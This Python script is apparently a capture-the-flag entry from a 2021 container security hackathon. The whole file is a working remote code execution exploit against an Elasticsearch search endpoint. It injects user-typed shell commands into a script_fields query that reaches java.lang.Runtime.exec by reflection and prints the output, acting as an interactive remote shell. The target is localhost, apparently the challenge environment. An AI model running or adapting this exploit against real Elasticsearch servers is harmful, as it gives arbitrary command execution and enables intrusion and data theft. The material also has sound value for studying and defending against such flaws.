#!/usr/bin/env python3

# SomeDayPWN at HACKATHON CONTAINER SECURITY CHALLENGE 2021
# 08.12.2021

import json
import requests


host = "127.0.0.1"
port = "9200"
url = f"http://{host}:{port}/_search?pretty"


while True:

	cmd = input("Enter command: ")
	if cmd == "script_exit":
		break
	payload = '{"size":1, "script_fields": {"data_leak":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"%s\\").getText()"}}}' %(cmd)
	r = requests.post(url=url, data=payload)
	try:
		print(json.loads(r.text)['hits']['hits'][0]['fields']['data_leak'][0])
	except:
		print(r.text)